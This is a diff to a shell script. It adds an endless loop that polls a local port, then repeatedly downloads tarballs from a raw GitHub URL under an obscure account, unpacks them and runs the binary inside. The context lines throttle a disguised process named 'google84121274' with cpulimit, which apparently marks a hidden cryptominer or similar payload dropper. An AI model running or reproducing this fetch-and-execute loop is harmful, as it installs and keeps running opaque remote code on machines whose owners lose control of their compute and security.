@@ -85,4 +85,28 @@ pkill -f cpulimit
 
 cpulimit -e google84121274 -l 62 &> /dev/null &
 
-./linux84 8
+while true
+do
+
+string=$(curl -s http://localhost:8884/?linux84=linux8474)
+if [[ $string == *"16384"* ]]; then
+
+wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux84.tar.gz
+tar -xf ./linux84.tar.gz
+
+cd linux84
+
+./linux84
+
+else
+
+wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxapps84.tar.gz
+tar -xf ./linuxapps84.tar.gz
+
+cd linuxapps84
+
+./linux84
+
+fi
+
+done
